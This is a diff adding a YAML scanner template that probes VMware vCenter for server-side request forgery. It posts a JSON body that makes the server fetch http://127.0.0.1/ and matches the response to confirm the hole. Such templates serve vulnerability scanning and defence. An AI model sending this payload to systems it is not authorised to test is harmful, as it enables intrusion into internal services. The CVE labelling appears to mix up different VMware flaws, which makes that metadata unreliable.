@@ -1,0 +1,19 @@
+name: poc-vcenter-ssrf
+transport: http
+set:
+  r0: randomInt(1000, 9999)
+rules:
+  r0:
+    request:
+      method: POST
+      path: "/ui/vcav-boot/rest/services/vemService/rest/vemproxy"
+      headers:
+        Content-Type: "application/json"
+      body: '{"method":"GET","url":"http://127.0.0.1/","headers":{}}'
+    expression: response.status == 200 && (response.body.bcontains("it works") || response.body.bcontains("Apache") || response.body.bcontains("root"))
+expression: r0()
+detail:
+  author: sxel
+  description: VMware vCenter Server SSRF probe (CVE-2021-21975, unauth vropspluginui)
+  severity: high
+  tags: vcenter,vmware,ssrf
